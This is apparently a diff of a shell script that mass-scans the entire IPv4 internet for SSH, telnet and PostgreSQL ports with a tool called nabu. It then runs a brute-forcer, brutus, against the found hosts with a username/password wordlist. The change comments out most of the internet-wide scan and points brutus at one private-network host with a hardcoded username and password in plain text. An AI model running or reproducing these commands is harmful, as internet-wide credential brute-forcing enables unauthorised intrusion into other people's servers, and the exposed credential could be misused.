@@ -34,12 +34,7 @@ tar -xf brutus
 chmod  +x brutus 
 
 
-timeout  120s     ./nabu  -p 22    -host    0.0.0.0/0     >    ips_nabu  #ssh
-
-timeout  600s     ./nabu  -p 23    -host   0.0.0.0/0     >>    ips_nabu  #telnet
-
-timeout  600s     ./nabu  -p 5432  -host   0.0.0.0/0     >>    ips_nabu  #postgres
-
+#timeout  120s     ./nabu  -p 22    -host    0.0.0.0/0     >    ips_nabu  #ssh
 
 
 
@@ -48,12 +43,12 @@ grep -v "^127\." ips_nabu >  my_ips
 
 
 
+#./brutus creds   --targets-file   my_ips      -U  lista.txt   -P  lista.txt  -q      >>     /var/tmp/my_ips.txt
 
-./brutus creds   --targets-file   my_ips      -U  lista.txt   -P  lista.txt  -q  -t 20    >>     /var/tmp/ssh.txt  
+
+./brutus  creds --target  192.168.1.24:22   -u logical -p atilalima123  -q   --json   >>     /var/tmp/my_ips.txt
+
  
-
-
-#600s is 10 min
 
 
 
